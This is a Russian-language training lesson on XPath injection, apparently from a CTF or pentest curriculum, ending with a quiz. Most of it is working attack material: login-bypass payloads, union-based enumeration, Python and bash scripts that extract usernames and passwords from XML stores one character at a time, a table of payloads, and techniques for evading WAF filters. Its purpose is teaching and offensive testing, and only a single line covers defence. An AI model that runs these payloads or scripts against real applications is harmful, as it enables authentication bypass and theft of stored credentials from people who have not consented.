---
id: web-xpath-injection
title: "XPath-инъекции: обход аутентификации и извлечение XML"
category: web
parent: web-nosql-ldap-xpath
difficulty: medium
order: 3
tags: [xpath, xml, injection, auth]
prerequisites: [web-nosql-ldap-xpath]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "XPath-инъекции: подмена логики запроса к XML, обход логина, слепое извлечение узлов и атрибутов."
---

XPath — язык запросов к XML-документам. Когда приложение строит XPath-выражение конкатенацией пользовательского ввода (классически — проверка логина/пароля по XML-базе пользователей), появляется **XPath-инъекция**. В отличие от SQL, здесь нет stacked queries и нет записи данных — зато есть обход аутентификации и полное извлечение содержимого XML. Встречается в SOAP-сервисах, SAML, старых XML-«базах» и Java/PHP/.NET-приложениях на XPath.

## Теория: XPath и точка инъекции

Типичный уязвимый код:

```java
String q = "//users/user[username/text()='" + user + "' and password/text()='" + pass + "']";
XPathExpression e = xpath.compile(q);
```

Если `user` = `admin' or '1'='1`, выражение становится всегда истинным:

```xpath
//users/user[username/text()='admin' or '1'='1' and password/text()='...']
```

→ обход логина. XPath-инъекция опасна именно там, где XML используется как хранилище.

## Синтаксис XPath, полезный для инъекции

| Конструкция | Значение |
|-------------|----------|
| `'` / `"` | разрыв строкового литерала |
| `or '1'='1` | всегда истинно |
| `and '1'='2` | всегда ложно |
| `//node` | выбрать все узлы |
| `count(//user)` | число узлов (boolean/time oracle) |
| `string-length(//user[1]/pass)` | длина строки |
| `substring(//user[1]/pass,1,1)` | символ |
| `name(/*)` | имя корня |
| `//*[contains(name(),'pass')]` | поиск по имени |
| `|` | union (в XPath 1.0) |

Комментариев в XPath нет, поэтому «закомментировать хвост» нельзя — подбирайте баланс кавычек и скобок.

## Вектор 1: обход аутентификации

```text
username=admin' or '1'='1
username=admin' or 1=1 or '1'='1
username=' or ''='
username=admin'] | //* | //*['
password=anything
```

Другой приём — обход проверки пароля: `' or '1'='1' or ''='`. Если приложение возвращает первого пользователя при истинном предикате, вход выполняется под `admin`.

## Вектор 2: перечисление структуры XML

Когда виден вывод, можно вытащить структуру и данные:

```text
' or 1=1] | //user/* | //*['
' or 1=1] | //user[1]/* | //*['
```

Union (`|`) позволяет присоединить произвольные узлы к результату и увидеть их в ответе.

## Вектор 3: слепое извлечение (boolean)

Если вывод не отражается, но приложение различает «нашли/не нашли», извлекаем побайтово через `substring`:

```text
' or substring(//user[1]/password,1,1)='a' or '1'='2
```

Автоматизация: перебираем позицию и символ, смотрим на разницу ответов. Аналогично `string-length(//user[1]/password)=N` для длины.

## Вектор 4: ошибки и тайминг

- **Error-based.** Некорректный XPath (`' or count(//x)=bad`) вызывает исключение; по тексту ошибки можно угадывать данные через `count`/`substring` в условиях.
- **Timing.** Некоторые движки (XPath 2.0/3.0, Saxon) позволяют тяжёлые выражения (`//*[contains(name(),'a')]` по огромному документу) — по времени ответа можно строить oracle. В XPath 1.0 тайминга почти нет.

## Разобранный пример: обход логина

Цель: `POST /login` с `username`/`password`, проверка по XML.

Шаг 1 — проверка разрыва кавычки:

```bash
curl -s -X POST https://app.example/login --data-urlencode "username=admin'" --data-urlencode "password=x"
# ошибка XPath / 500 -> инъекция
```

Шаг 2 — обход:

```bash
curl -s -X POST https://app.example/login --data-urlencode "username=admin' or '1'='1" --data-urlencode "password=x" -c cookies.txt
```

Шаг 3 — если вернулся админский профиль/сессия — вход выполнен.

## Разобранный пример: blind extraction

Цель не отражает результат, но даёт разный статус. Скрипт-заготовка:

```python
import requests, string
url = "https://app.example/search"
def oracle(cond):
    r = requests.post(url, data={"q": f"' or {cond} or '1'='2"})
    return "found" in r.text
# длина
for n in range(1, 40):
    if oracle(f"string-length(//user[1]/password)={n}"):
        print("len", n); L=n; break
# символы
pw = ""
for i in range(1, L+1):
    for c in string.printable:
        if oracle(f"substring(//user[1]/password,{i},1)='{c}'"):
            pw += c; break
print(pw)
```

Для большого алфавита используйте бинарный поиск через сравнение кодов (`string-to-codepoints` в XPath 2.0 или `<`/`>` для символов).

## Контексты инъекции

- Формы логина/поиска по XML.
- SOAP-запросы с XPath-фильтрами.
- SAML/`AttributeQuery` с XPath.
- REST-эндпоинты, принимающие XPath (`xpath=`, `query=`, `filter=`).
- Java (`javax.xml.xpath`), PHP (`DOMXPath`), .NET (`XPathNavigator`).
- Признаки в ошибках: `XPathException`, `DOMXPath::query()`, `XPath syntax error`, `javax.xml.xpath`.

## Инструменты

- **`curl`** — ручная проверка и payload.
- **Burp Intruder** — перебор символов/позиций при blind.
- **`xcat`/`xxe-xpath`-скрипты** — автоматизация XPath-blind.
- **`xmllint --xpath`** — локальная проверка выражений.
- **`ffuf`** — поиск эндпоинтов с XPath-параметрами.

## Что дальше / decision

1. Параметр уходит в XPath → проверьте `'` (ошибка = инъекция).
2. Вывод виден → `| //* |` union для извлечения.
3. Вывод скрыт, но есть boolean-разница → `substring`-blind.
4. Есть только ошибки → error-based oracle.
5. Дальше — эскалация к XXE (см. `web-xxe`), если тот же парсер принимает XML-сущности.

## Частые ошибки

- **Путать с SQLi.** Нет stacked queries/записи; синтаксис другой.
- **Не балансировать кавычки/скобки.** XPath строг — незакрытая скобка = ошибка.
- **Ждать `--` комментария.** В XPath его нет.
- **Сдаваться без вывода.** Используйте boolean/error-blind.
- **Забыть про XPath 2.0.** Там больше функций (`matches`, `codepoints`).
- **Ломать прод.** Только с согласия.

## Полный разбор: слепое извлечение XPath через boolean (с выводом)

Цель — страница, где ввод уходит в XPath, но результат не отражается напрямую. Работаем по аналогии с boolean-based SQLi.

Шаг 1. Находим точку инъекции в login. Обычный запрос:

```
//users/user[username/text()='admin' and password/text()='x']
```

Шаг 2. Пробуем всегда-истинное условие в username:

```bash
curl -s -X POST https://app.example/login --data "user=' or '1'='1&pass=x"
# Welcome, admin   -> инъекция подтверждена
```

Шаг 3. Строим слепое извлечение. Определяем длину имени первого узла:

```bash
for n in $(seq 1 20); do
  r=$(curl -s -X POST https://app.example/login \
      --data "user=' or string-length(//user[1]/username)=$n and '1'='1&pass=x")
  echo -n "$r" | grep -q Welcome && echo "length=$n" && break
done
# length=5
```

Шаг 4. Побайтово извлекаем значение через `substring`:

```bash
for i in $(seq 1 5); do
  for c in {a..z}; do
    r=$(curl -s -X POST https://app.example/login \
        --data "user=' or substring(//user[1]/username,$i,1)='$c' and '1'='1&pass=x")
    echo -n "$r" | grep -q Welcome && { echo -n "$c"; break; }
  done
done; echo
# admin
```

Шаг 5. Автоматизируем в скрипте (лучше — по ASCII-кодам через `string-to-codepoints`), чтобы вытянуть весь XML, включая пароли.

## XPath 2.0 и функции, полезные для инъекции

| Функция | Назначение в атаке |
|---------|-------------------|
| `string-length(expr)` | длина строки/значения |
| `substring(expr,pos,len)` | посимвольное извлечение |
| `string-to-codepoints()` | ASCII-перебор (быстрее букв) |
| `count(//node)` | число узлов (структура документа) |
| `name(//*[1])` | имя первого узла (разведка структуры) |
| `//user[position()=1]` | доступ к узлу по позиции |
| `normalize-space()` | обход проверок с пробелами |
| `contains(a,b)` | поиск подстроки |
| `starts-with(a,b)` | проверка префикса |
| `translate(a,b,c)` | обход фильтров регистра |
| `true()`/`false()` | константы для boolean |

XPath 2.0 в некоторых движках поддерживает `doc()`, `collection()`, `doc-available()` — потенциальное чтение произвольных файлов (XXE-подобный эффект), если движок включён.

## Reference-таблица: payload'ы XPath по контексту

| Контекст | Payload | Эффект |
|----------|---------|--------|
| Auth (username) | `' or '1'='1` | обход логина |
| Auth (username) | `' or 1=1 or ''='` | альтернативная форма |
| Auth (пароль) | `x' or '1'='1` | если проверяется только пароль |
| Boolean-blind | `' or substring(//user[1]/password,1,1)='a' and '1'='1` | извлечение |
| Структура | `' or name(//*[1])='users' and '1'='1` | имя корня |
| Число узлов | `' or count(//user)=5 and '1'='1` | разведка |
| Комментарий | `' or '1'='1' or '` | обрезка остатка условия |
| Node-set в сравнении | `' or //user[1]/password/text()='admin' or '1'='2` | прямое сравнение |

## Обход фильтров и WAF

- **Регистр:** если режется `or`, используйте `OR`, `oR`, `Or` — XPath 1.0 регистрозависим, но фильтры часто нет.
- **Пробелы:** вместо пробелов — `/**/`, табы, `%09`, склейка `or(1=1)`.
- **Кавычки:** чередуйте `'` и `"`; если оба фильтруются, используйте `concat('a','b')`.
- **`translate()`:** чтобы обойти чёрный список символов — `translate('abc','abc','ABC')`.
- **Функции:** `substring`, `contains`, `starts-with` — многие WAF их не знают.
- **Кодирование:** URL-encode (`%27%20or%20%271%27%3D%271`), double-encode, unicode.
- **Числовые точки:** если вход приводится к числу, `1 or 1=1` без кавычек.

## Разобранный пример: извлечение паролей узла

```bash
# определяем длину пароля первого пользователя
for n in $(seq 1 40); do
  r=$(curl -s -X POST https://app.example/login \
      --data "user=' or string-length(//user[1]/password)=$n and '1'='1&pass=x")
  echo -n "$r" | grep -q Welcome && { L=$n; break; }
done
# посимвольно (по ASCII для надёжности)
out=""
for i in $(seq 1 $L); do
  for c in $(seq 32 126); do
    r=$(curl -s -X POST https://app.example/login \
        --data "user=' or string-to-codepoints(substring(//user[1]/password,$i,1))=$c and '1'='1&pass=x")
    echo -n "$r" | grep -q Welcome && { out+=$(printf "\\$(printf '%03o' $c)"); break; }
  done
done
echo "password=$out"
```

## Что делать дальше / решение

1. **Определить движок** (libxml/PHP, Java XPath, .NET) — от него зависят доступные функции.
2. **Обход логина** быстрой проверкой `' or '1'='1`.
3. **Если результат не отражается** — boolean-blind через `substring`/`string-to-codepoints`.
4. **Если видны ошибки** — error-based: вытягивайте структуру и значения из текста исключения.
5. **Разведать структуру** через `name()`, `count()`, `//*`.
6. Далее — извлечь все секретные узлы (пароли, токены) и записать артефакт.

## Квиз

```quiz
- question: "Где применяется XPath-инъекция?"
  options:
    - "В SQL-БД"
    - "В запросах к XML-данным, построенных конкатенацией"
    - "В TLS"
    - "В cookie"
  answer: 1
  explanation: "XPath — язык запросов к XML."
- question: "Какой payload обходит XPath-логин?"
  options:
    - '{"$ne":null}'
    - "' or '1'='1"
    - "*)(uid=*"
    - "{{7*7}}"
  answer: 1
  explanation: "OR делает условие истинным."
- question: "Какая функция извлекает подстроку в XPath?"
  options:
    - "SUBSTR"
    - "substring()"
    - "left()"
    - "mid()"
  answer: 1
  explanation: "substring(//user[1]/password,1,1)."
- question: "Чем опасна функция document() в XPath?"
  options:
    - "Она медленная"
    - "Читает внешние XML/файлы (SSRF/чтение)"
    - "Она шифрует"
    - "Она кеширует"
  answer: 1
  explanation: "Внешние документы в некоторых движках."
- question: "Как извлечь значение вслепую?"
  options:
    - "UNION"
    - "Бинарный оракул + substring/string-length"
    - "sleep"
    - "DROP"
  answer: 1
  explanation: "Пошаговый подбор через булев сигнал."
```

## Где пригодится

- **CTF (Web):** задачи на XML-логин/поиск.
- **Bug bounty:** обход аутентификации — критичный отчёт.
- **Пентест:** аудит XML-хранилищ.
- **Работа (AppSec):** параметризация XPath, экранирование, отключение опасных функций.
